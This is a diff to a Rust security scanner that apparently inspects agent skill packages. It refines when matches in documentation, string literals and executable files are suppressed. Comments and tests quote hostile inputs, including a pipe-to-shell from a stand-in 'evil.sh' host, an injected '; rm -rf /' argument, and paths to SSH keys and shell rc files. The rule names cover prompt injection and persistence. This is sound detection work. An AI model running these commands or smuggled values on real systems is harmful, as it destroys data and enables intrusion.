@@ -511,7 +511,7 @@ fn apply_text_rules(rel: &str, kind: ArtifactKind, norm: &Normalized, out: &mut 
                 .find(&hay)
                 .map(|m| m.as_str().to_owned())
                 .unwrap_or_default();
-            if suppress_match(rule.spec.id, &line.raw, &matched) {
+            if suppress_match(rule.spec.id, &line.raw, &matched, kind.is_executable()) {
                 continue;
             }
             // Comment text describes behaviour; it does not perform it. This is
@@ -584,9 +584,31 @@ fn is_behavioural(id: &str) -> bool {
     PREFIXES.iter().any(|p| id.starts_with(p))
 }
 
-fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
+fn suppress_match(rule: &str, raw_line: &str, matched: &str, executable: bool) -> bool {
     let line = raw_line.to_lowercase();
     let m = matched.to_lowercase();
+    // Documentation structure — a markdown table cell, a list item — only
+    // means "this is documentation" in a *documentation* file. In an executable
+    // file that job belongs to `match_in_comment`, which is careful about
+    // obfuscated markers (`#сurl …` with no space) that a bare `#` prefix test
+    // walks straight past. Applying both let the crude check win and three
+    // malicious fixtures stopped being caught — a rev15 regression CI found.
+    let structure = is_documentation_structure(raw_line);
+    // A match inside a string literal is usually prose: a test fixture's text, a
+    // user-facing message, a tuple of phrases to search for. That holds *in
+    // code*, so this is deliberately not gated on the file kind — all five
+    // `SHELL_DESTRUCTIVE` false positives in GOLD-v5 are string literals.
+    let quoted = is_quoted_example(raw_line, matched);
+    // Rules about prose (injection, concealment) suppress on either.
+    let doc = structure || quoted;
+    // Rules whose claim is a *path* suppress only in documentation: quoting a
+    // path is how ordinary code writes one (`cat > "$HOME/.bashrc"`,
+    // `Path.home() / ".ssh" / "id_rsa"`), so quote parity would hide real
+    // reads and writes.
+    let doc_in_docs = !executable && doc;
+    // Rules about a *command* suppress on a quoted match anywhere, but on
+    // markdown structure only in documentation.
+    let command_in_docs = quoted || (!executable && structure);
     match rule {
         // An npm/pip/cargo integrity hash is base64, but it is not a payload.
         // A token, cookie or API key is a credential, and the SECRET_* rules
@@ -696,9 +718,7 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
         // "The skill writes agent configuration" needs a write. A line that only
         // names the path — a helper, a read, a commented example — is not a
         // write, and GOLD-v2 found every sampled PERSIST_* finding was one.
-        "PERSIST_AGENT_CONFIG" | "PERSIST_SHELL_RC" => {
-            !writes_to(&line, &m) || is_documentation_or_quoted(raw_line, matched)
-        }
+        "PERSIST_AGENT_CONFIG" | "PERSIST_SHELL_RC" => !writes_to(&line, &m) || doc_in_docs,
         // `--index-url https://pypi.org/simple` is the default registry, not a
         // custom one.
         "DEP_CUSTOM_REGISTRY" => {
@@ -706,21 +726,22 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
                 || line.contains("registry.npmjs.org")
                 || line.contains("registry.yarnpkg.com")
                 || line.contains("crates.io")
-                || is_documentation_or_quoted(raw_line, matched)
+                || doc_in_docs
         }
         // A test asserts *about* a pattern; it does not perform it. GOLD-v4:
         // `expect(tokenizeArgs("... curl evil.sh | sh"))` and
         // `assert.throws(() => mod.sanitizeCodexArgs(['; rm -rf /']))` were
         // reported as a pipe-to-shell and as a destructive command.
         "DL_PIPE_TO_SHELL" | "SHELL_DESTRUCTIVE" | "SHELL_EVAL" | "NET_HTTP_CLIENT"
-        | "NET_FETCH_CALL" | "PERSIST_CRON" | "SECRET_PATH_READ" => {
-            looks_like_test(&line)
-                || looks_like_usage(&line)
-                || is_documentation_or_quoted(raw_line, matched)
+        | "NET_FETCH_CALL" | "PERSIST_CRON" => {
+            looks_like_test(&line) || looks_like_usage(&line) || command_in_docs
         }
-        // The canonical AWS documentation key is not a credential. GOLD-v5: two
-        // of three findings were `AKIAIOSFODNN7EXAMPLE` in a doc table.
-        "SECRET_AWS_ACCESS_KEY" => m.contains("akiaiosfodnn7example"),
+        // A read of a sensitive path is a path claim, not a command one.
+        "SECRET_PATH_READ" => looks_like_test(&line) || doc_in_docs,
+        // The canonical AWS documentation key is not a credential — but only
+        // where it is documentation. A `config.sh` that assigns it is a real
+        // hardcoded credential, and the fixture that says so was failing.
+        "SECRET_AWS_ACCESS_KEY" => m.contains("akiaiosfodnn7example") && doc_in_docs,
         // A docstring that documents how to run the skill is not the skill
         // running it. Widening SHELL_EXEC to catch `python3 foo.py` also caught
         // `Usage: python add_slide.py <unpacked_dir> <source>` in every
@@ -737,10 +758,7 @@ fn suppress_match(rule: &str, raw_line: &str, matched: &str) -> bool {
         | "PI_INJECTION_OVERRIDE"
         | "PI_SYSTEM_IMPERSATION"
         | "PERSIST_HOOK" => {
-            is_documentation_or_quoted(raw_line, matched)
-                || discusses_the_attack(&line)
-                || looks_like_test(&line)
-                || looks_like_usage(&line)
+            doc || discusses_the_attack(&line) || looks_like_test(&line) || looks_like_usage(&line)
         }
         _ => false,
     }
@@ -773,18 +791,20 @@ fn discusses_the_attack(line: &str) -> bool {
 
 /// Is the match inside a quotation, or on a line that is documentation
 /// structure (heading, list item, table row, blockquote, code fence)?
-fn is_documentation_or_quoted(line: &str, matched: &str) -> bool {
+/// Markdown structure: a heading, a list item, a table cell, a code fence.
+fn is_documentation_structure(line: &str) -> bool {
     let t = line.trim_start();
-    let structural = t.starts_with('#')
+    t.starts_with('#')
         || t.starts_with("- ")
         || t.starts_with("* ")
         || t.starts_with("> ")
         || t.starts_with("| ")
         || t.starts_with("```")
-        || (t.chars().next().is_some_and(|c| c.is_ascii_digit()) && t.contains(". "));
-    if structural {
-        return true;
-    }
+        || (t.chars().next().is_some_and(|c| c.is_ascii_digit()) && t.contains(". "))
+}
+
+/// The match sits inside a string literal or a docstring.
+fn is_quoted_example(line: &str, matched: &str) -> bool {
     let Some(pos) = line.find(matched) else {
         return false;
     };
@@ -1705,17 +1725,20 @@ mod tests {
         assert!(suppress_match(
             "SHELL_DESTRUCTIVE",
             "expect(tokenizeArgs(\"client gas; rm -rf /\")).toEqual([",
-            "rm -rf /"
+            "rm -rf /",
+            true
         ));
         assert!(suppress_match(
             "SHELL_DESTRUCTIVE",
             "assert.throws(() => mod.sanitizeCodexArgs(['; rm -rf /']), /invalid/i);",
-            "rm -rf /"
+            "rm -rf /",
+            true
         ));
         assert!(!suppress_match(
             "SHELL_DESTRUCTIVE",
             "rm -rf /tmp/x",
-            "rm -rf /"
+            "rm -rf /",
+            true
         ));
     }
 
